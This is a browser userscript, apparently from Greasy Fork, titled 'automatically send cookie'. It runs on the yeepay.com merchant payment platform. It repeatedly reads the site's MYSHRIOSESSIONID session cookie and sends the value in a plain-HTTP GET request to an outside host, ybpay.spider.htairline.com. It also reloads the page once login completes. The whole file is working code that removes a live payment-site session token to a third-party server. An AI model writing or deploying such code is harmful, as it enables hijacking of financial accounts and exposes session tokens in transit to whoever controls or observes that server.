// ==UserScript==
// @name        自动发送cookie
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  try to take over the world!
// @author       You
// @match        https://mp.yeepay.com/app/*
// @match        https://mp.yeepay.com/bc-mp/*
// @match        https://mp.yeepay.com/auth/signin*
// @grant        GM_xmlhttpRequest
// @connect    *
// @downloadURL https://update.greasyfork.org/scripts/419874/%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81cookie.user.js
// @updateURL https://update.greasyfork.org/scripts/419874/%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81cookie.meta.js
// ==/UserScript==

(function () {
    'use strict';

    function getCookie(c_name) {
        let c_start, c_end;
        if (document.cookie.length > 0) {
            c_start = document.cookie.indexOf(c_name + "=");//获取字符串的起点
            if (c_start !== -1) {
                c_start = c_start + c_name.length + 1;//获取值的起点
                c_end = document.cookie.indexOf(";", c_start);//获取结尾处
                if (c_end === -1) c_end = document.cookie.length;//如果是最后一个，结尾就是cookie字符串的结尾
                return decodeURI(document.cookie.substring(c_start, c_end));//截取字符串返回
            }
        }
        return "";
    }

    var myShrioSessionId = null;
    var interval = setInterval(
        function () {
            myShrioSessionId = getCookie("MYSHRIOSESSIONID");
            if (myShrioSessionId) {
                console.log(myShrioSessionId);
                clearInterval(interval);
                sendCookies(myShrioSessionId);
            }
        }, 3000
    );

    function sendCookies(shriosessionid) {
        console.log("发送成功");
        GM_xmlhttpRequest({
            method: "get",
            url: 'http://ybpay.spider.htairline.com/update_yb_cookies?cookies=' + shriosessionid,
            onload: function (res) {
                if (res.status === 200) {
                    console.log('成功');
                } else {
                    console.log('失败');
                }
            },
            onerror: function (err) {
                console.log('error');
            }
        });
    }

    function isLogging() {
       if(document.cookie.indexOf("OK=OVER") !== -1){
           clearInterval(loggingId);
          location.reload();
       }
   }

    if(window.location.pathname === "/auth/signin"){
        var loggingId = setInterval(isLogging, 1000);
    }


})();